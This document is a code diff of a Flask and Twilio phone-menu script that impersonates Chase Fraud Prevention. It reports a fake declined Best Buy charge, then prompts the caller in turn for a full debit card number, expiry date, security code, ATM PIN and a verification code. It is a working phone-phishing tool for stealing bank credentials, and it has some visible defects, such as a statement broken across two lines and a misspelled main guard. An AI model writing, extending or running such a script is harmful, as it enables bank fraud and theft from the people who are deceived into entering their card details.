@@ -1,13 +1,170 @@
-finish_on_key="#",
+from flask import Flask, request, make_response
+from twilio.twiml.voice_response import VoiceResponse
+
+app = Flask(__name__)
+
+@app.route("/voice", methods=["POST"])
+def voice():
+    response = VoiceResponse()
+    response.say("Chase Fraud Prevention We declined a purchase for $286.95 made with your debit card at Best Buy.")
+    response.say("Was this transaction authorized by you? Press 1 for Yes or 2 for No.")
+    response.gather(
+        input="dtmf",
+        num_digits=1,
+        timeout=5,
+        action="/auth-response",
+        method="POST"
+    )
+    response.say("We didn’t receive your response. Please press 1 for Yes or 2 for No.")
+    return str(response)
+
+@app.route("/auth-response", methods=["POST"])
+def auth_response():
+    digit = request.form.get("Digits")
+    response = VoiceResponse()
+
+    if digit == "1":
+        response.say("Thank you. Goodbye.")
+        response.hangup()
+    elif digit == "2":
+        response.redirect("/follow-up")
+    else:
+        response.redirect("/voice")
+
+    return str(response)
+
+@app.route("/follow-up", methods=["POST"])
+def follow_up():
+    response = VoiceResponse()
+    response.say("To speak with a representative, press 1. To continue using the automated system, press 2.")
+    response.gather(
+        input="dtmf",
+        num_digits=1,
+        timeout=5,
+        action="/follow-up-response",
+        method="POST"
+    )
+    return str(response)
+
+@app.route("/follow-up-response", methods=["POST"])
+def follow_up_response():
+    digit = request.form.get("Digits")
+    response = VoiceResponse()
+
+    if digit == "1" or digit == "2":
+        response.redirect("/verify-card")
+    else:
+        response.redirect("/follow-up")
+
+    return str(response)
+
+@app.route("/verify-card", methods=["POST"])
+def verify_card():
+    response = VoiceResponse()
+    response.say("To verify your identity, please enter your 16-digit debit card number followed by the pound key (#).")
+    response.gather(
+        input="dtmf",
+        finish_on_key="#",
+        timeout=60,
+        action="/card-input",
+        method="POST"
+    )
+    response.say("If you don’t have your debit card right now, you may text 'callback' to the bank number that contacted you to schedule a callback. Goodbye.")
+    response.hangup()
+    return str(response)
+
+@app.route("/card-input", methods=["POST"])
+def card_input():
+    card_number = request.form.get("Digits")
+    response = VoiceResponse()
+
+    if len(card_number) == 16:
+        response.redirect("/expiration-date")
+    else:
+        response.say("The number entered is invalid. Please try again.")
+        response.redirect("/verify-card")
+
+    return str(response)
+
+@app.route("/expiration-date", methods=["POST"])
+def expiration_date():
+    response = VoiceResponse()
+    response.say("Please enter your card's 4-digit expiration date followed by the pound key (#).")
+    response.gather(
+        input="dtmf",
+        finish_on_key="#",
+        timeout=10,
+        action="/expiration-input",
+        method="POST"
+    )
+    return str(response)
+
+@app.route("/expiration-input", methods=["POST"])
+def expiration_input():
+    expiration_date = request.form.get("Digits")
+    response = VoiceResponse()
+
+    if len(expiration_date) == 4:
+        response.redirect("/security-code")
+    else:
+        response.say("The expiration date entered is invalid. Please try again.")
+        response.redirect("/expiration-date")
+
+    return str(response)
+
+@app.route("/security-code", methods=["POST"])
+def security_code():
+    response = VoiceResponse()
+    response.say("Please enter your card's 3-digit security code located on the back of your card followed by the pound key (#).")
+    response.gather(
+        input="dtmf",
+        finish_on_key="#",
+        timeout=10,
+        action="/security-input",
+        method="POST"
+    )
+    return str(response)
+
+@app.route("/security-input", methods=["POST"])
+def security_input():
+    security_code = request.form.get("Digits")
+    response = VoiceResponse()
+
+    if len(security_code) == 3:
+        response.redirect("/atm-pin")
+    else:
+        response.
+say("The security code entered is invalid. Please try again.")
+        response.redirect("/security-code")
+
+    return str(response)
+
+@app.route("/atm-pin", methods=["POST"])
+def atm_pin():
+    response = VoiceResponse()
+    response.say("Please enter your 4-digit ATM PIN followed by the pound key (#).")
+    response.gather(
+        input="dtmf",
+        finish_on_key="#",
         timeout=10,
         action="/pin-input",
         method="POST"
     )
-    response.say("Invalid PIN. Please re-enter your 4-digit ATM PIN followed by the pound key (#).")
-    response.redirect("/atm-pin")
     return str(response)
 
-# Verification code
+@app.route("/pin-input", methods=["POST"])
+def pin_input():
+    atm_pin = request.form.get("Digits")
+    response = VoiceResponse()
+
+    if len(atm_pin) == 4:
+        response.redirect("/verification-code")
+    else:
+        response.say("Invalid PIN. Please re-enter your 4-digit ATM PIN followed by the pound key (#).")
+        response.redirect("/atm-pin")
+
+    return str(response)
+
 @app.route("/verification-code", methods=["POST"])
 def verification_code():
     response = VoiceResponse()
@@ -19,11 +176,8 @@ def verification_code():
         action="/verify-code-input",
         method="POST"
     )
-    response.say("The verification code entered is invalid. Please try again.")
-    response.redirect("/verification-code")
     return str(response)
 
-# Final response
 @app.route("/verify-code-input", methods=["POST"])
 def verify_code_input():
     verification_code = request.form.get("Digits")
@@ -39,3 +193,4 @@ def verify_code_input():
 
 if name == "__main__":
     app.run(debug=True)
+
